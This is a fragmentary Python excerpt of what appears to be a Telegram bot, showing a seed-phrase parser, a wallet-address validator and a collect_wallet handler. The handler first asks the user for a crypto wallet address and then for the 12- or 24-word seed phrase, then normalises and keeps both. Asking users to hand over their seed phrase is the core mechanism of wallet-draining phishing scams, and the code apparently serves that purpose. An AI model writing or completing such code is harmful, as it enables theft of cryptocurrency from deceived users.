...
def parse_phrase_words(text: str):
    """
    Robustly extract words from a seed phrase input.
    Handles: commas, extra spaces, newlines, tabs, numbered lists (1. word),
    mixed punctuation. Lowercases everything.
    """
    # Lowercase first
    text = text.lower()
    # Replace all non-alpha characters (commas, dots, dashes, newlines, tabs, digits) with spaces
...
def validate_address(chain: str, address: str):
    """Returns (is_valid, error_message_or_None). Chain-specific format checks."""
    # Strip whitespace the user might accidentally include
...
async def collect_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if step == "address":
        ...
        if not valid:
            retry_msg = f"{error}\n\n🔁 <b>Please send your {chain} wallet address again.</b>"
            await send_reply(update, retry_msg, kb_cancel())
            return  # Stay on step 1

        # Valid address — save and move to step 2
    ...
    # ── Step 2: Seed phrase ───────────────────────────────────────────────────
        ...
        if not valid:
            retry_msg = f"{error}\n\n🔁 <b>Please send your {chain} seed phrase again (12 or 24 words).</b>"
            await send_reply(update, retry_msg, kb_cancel())
            return  # Stay on step 2

        # Both valid — finalise
        address = context.user_data.get("pending_address", "N/A")
        phrase = " ".join(parse_phrase_words(text))  # normalised
